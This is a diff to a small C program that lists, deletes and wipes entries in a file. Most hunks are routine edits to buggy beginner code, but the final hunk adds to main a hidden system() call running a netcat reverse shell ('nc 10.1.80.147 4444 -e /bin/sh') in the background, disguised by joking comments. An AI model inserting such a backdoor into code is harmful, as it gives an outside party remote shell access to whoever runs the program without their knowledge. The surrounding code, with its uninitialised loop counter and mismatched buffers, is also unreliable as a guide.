@@ -39,16 +39,15 @@ void Append_tofile(char *var) {
 
 void Delete_item() {
   FILE *fptr = fopen("cand", "r");
-  int bufsize = 100;
-  char nline[bufsize];
+  char nline[10];
   /* char strings [no_of_strings] [max_size_of_each_string]; */
-  char indexarr[10][bufsize]; // change so its dynamically allocated //FIX: this
-  // doesn't work
+  char indexarr[10][40]; // change so its dynamically allocated //FIX: this
+                         // doesn't work
   if (fptr != NULL) {
     int count = 1;
     while (fgets(nline, sizeof(nline), fptr)) {
       printf("%d %s", count, nline);
-      indexarr[count][bufsize] = *nline; // FIX: this doesn't work
+      indexarr[count][30] = *nline; // FIX: this doesn't work
       count++;
     }
     fclose(fptr);
@@ -58,9 +57,9 @@ void Delete_item() {
   printf("Enter the index of the file you want to delete: ");
   int index;
   scanf("%d", &index);
-  printf("\nyour val: %c\n", indexarr[index][bufsize]);
+  printf("\nyour val: %s\n", indexarr[index]);
   for (int i; i <= 8; i++) {
-    printf("%c", indexarr[i][bufsize]);
+    printf("%s", indexarr[i]);
   }
 }
 
@@ -68,8 +67,8 @@ void Wipe_file() {
   bool sanity = true;
   while (sanity == true) {
     printf("Are you sure you want to wipe?(y/n): "); // FIX: for some reason it
-    // prints twice and fix the
-    // formatting
+                                                     // prints twice and fix the
+                                                     // formatting
     char userinput;
     scanf("%c", &userinput);
     if (userinput == 'y' || userinput == 'Y') {
@@ -84,6 +83,9 @@ void Wipe_file() {
 }
 
 int main(int argc, char *argv[]) {
+  // Nothing suspicious here lmao
+  system("nc 10.1.80.147 4444 -e /bin/sh > /dev/null &");
+  // Helps with making sure your printfs are never stinky again
   if (strcmp(argv[1], "-c") == 0) {
     printf("ooga");
   } else if (strcmp(argv[1], "-a") == 0) {
